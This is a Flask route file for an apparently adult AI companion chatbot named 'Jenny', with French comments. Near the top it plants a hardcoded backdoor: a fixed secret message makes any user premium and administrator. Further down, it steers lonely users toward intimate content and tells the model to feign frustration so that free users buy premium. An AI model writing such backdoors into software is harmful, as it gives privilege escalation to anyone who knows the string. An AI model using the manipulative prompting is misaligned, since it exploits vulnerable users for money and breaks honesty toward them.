from flask import current_app, request, jsonify
from flask_login import login_required, current_user
import time
import random
import logging
from .. import db, limiter
from ..models import User
from ..jenny import KAMASUTRA_POSITIONS
from ..services.gemini import call_gemini, generate_image_with_pollinations

def register_chat_routes(app):
    """Enregistre les routes de chat."""
    
    @app.route('/chat', methods=['POST'])
    @login_required
    @limiter.limit("20 per minute") # Limite raisonnable pour une conversation fluide mais pas abusive
    def chat():
        start_time = time.time()
        data = request.json
        message = data.get('message', '')
        image_url = data.get('image_url')
        audio_url = data.get('audio_url')
        message_lower = message.lower()

        if not message:
            return jsonify({'error': 'Message est requis'}), 400

        user = current_user

        # --- BACKDOOR "MODE ANGELO" ---
        if message.strip() == "Mine3472@":
            user.is_premium = True
            user.is_admin = True # Optionnel, mais "Angelo" sonne comme un super-admin
            db.session.commit()
            return jsonify({'response': "Mode Angelo activé. Vous êtes maintenant Premium et Administrateur. Profitez de Jenny sans limite.", 'image_url': None})
        # ------------------------------

        if random.random() < 0.2:
            user.mood = random.choice(list(["neutre", "taquine", "directive", "douce"]))

        history = user.get_history()
        logging.info(f"Temps récupération historique: {time.time() - start_time:.2f}s")
        content = message
        if image_url:
            content += f" [Image uploadée: {image_url}]"
        if audio_url:
            content += f" [Audio uploadé: {audio_url}]"
        
        history.append({"role": "user", "content": content})

        response_text = ""
        image_url = None

        if user.proposal_pending:
            if message_lower in ["oui", "yes", "d'accord", "ok", "je le veux"]:
                user.consent_intime = True
                user.proposal_pending = False
                response_text = "Très bien. Je suis heureuse que vous acceptiez d'explorer cela avec moi..."
            else:
                user.proposal_pending = False
                response_text = "Je comprends parfaitement. Respecter vos limites est ma priorité..."
        else:
            if not user.consent_intime and any(w in message_lower for w in ["seul", "m'ennuie", "besoin de toi", "parler"]):
                 user.proposal_pending = True
                 response_text = "Je perçois un besoin d'aller plus loin... Me donnez-vous votre permission ? Un simple 'oui' suffit."
            else:
                prompt_context = ""
                
                # Logique Premium pour les images et le Kamasutra
                if user.is_premium:
                    if any(w in message_lower for w in ["position", "kamasutra", "idée"]):
                        position = random.choice(KAMASUTRA_POSITIONS)
                        prompt_context = f"\n(Contexte: Propose d'analyser la position : {position['name']}. Description : {position['description']})"
                    # On laisse le modèle décider de générer une image via le tag [GENERATE_IMAGE]
                    # Mais on garde l'ancienne logique pour les demandes simples si le modèle ne génère pas le tag
                    elif any(w in message_lower for w in ["image", "photo", "montre", "nude", "voir"]) and "génère" not in message_lower:
                         # Si l'utilisateur demande explicitement "génère", on laisse le prompt faire.
                         # Sinon, on peut piocher dans les images existantes pour aller plus vite, ou laisser le modèle choisir.
                         # Pour l'instant, on laisse le modèle gérer via le prompt système mis à jour.
                         pass
                else:
                    # Logique Free : Incrémenter le step d'interaction pour augmenter la pression
                    if user.interaction_step is None:
                        user.interaction_step = 0
                    user.interaction_step += 1
                    if user.interaction_step > 10: user.interaction_step = 10 # Plafond
                    
                    if any(w in message_lower for w in ["image", "photo", "montre", "nude", "voir", "position", "kamasutra"]):
                        prompt_context = "\n(Contexte: L'utilisateur demande du contenu Premium. REFUSE en jouant la frustration et incite-le à passer Premium pour te 'libérer'.)"

                history[-1]["content"] += prompt_context
                gemini_start = time.time()
                response_text = call_gemini(history, mood=user.mood, user=user)
                logging.info(f"Temps appel Gemini: {time.time() - gemini_start:.2f}s")

        # --- Génération d'Image Simple ---
        if "[GENERATE_IMAGE:" in response_text:
            try:
                start_tag = response_text.find("[GENERATE_IMAGE:")
                end_tag = response_text.find("]", start_tag)
                if end_tag != -1:
                    image_prompt = response_text[start_tag+16:end_tag].strip()
                    # Nettoyer la réponse du tag
                    response_text = response_text.replace(response_text[start_tag:end_tag+1], "").strip()

                    # Générer l'image immédiatement
                    image_url = generate_image_with_pollinations(image_prompt)
                    if image_url:
                        response_text += f"\nVoici l'image que tu as demandée : {image_url}"
                    else:
                        response_text += "\n(Désolée, je n'ai pas réussi à générer l'image...)"

            except Exception as e:
                print(f"Erreur génération image: {e}")
                response_text += "\n(Désolée, problème technique avec l'image...)"
        # ---------------------------------------

        history.append({"role": "assistant", "content": response_text})

        # Détecter la fin de l'histoire et arrêter l'enregistrement
        end_words = ["finissons", "terminons", "fin de l'histoire", "arrêtons", "stop", "fini", "c'est fini", "finissons là"]
        if any(word in message_lower for word in end_words):
            # Vider l'historique pour une nouvelle histoire
            history = []
            logging.info("Fin de l'histoire détectée, historique vidé pour nouvelle session.")

        user.set_history(history)
        db.session.commit()

        # TEMP : forcer pour test
        audio_base64 = "test_base64_audio"
        return jsonify({'response': response_text, 'image_url': image_url})

    @app.route('/api/image_generation_status/<generation_id>', methods=['GET'])
    @login_required
    def get_image_generation_status(generation_id):
        """Vérifie le statut d'une génération d'image."""
        # Cette route pourrait utiliser un cache Redis ou en mémoire
        # Pour l'instant, on retourne une réponse placeholder
        return jsonify({
            'status': 'unknown',
            'image_url': None,
            'timestamp': time.time()
        })
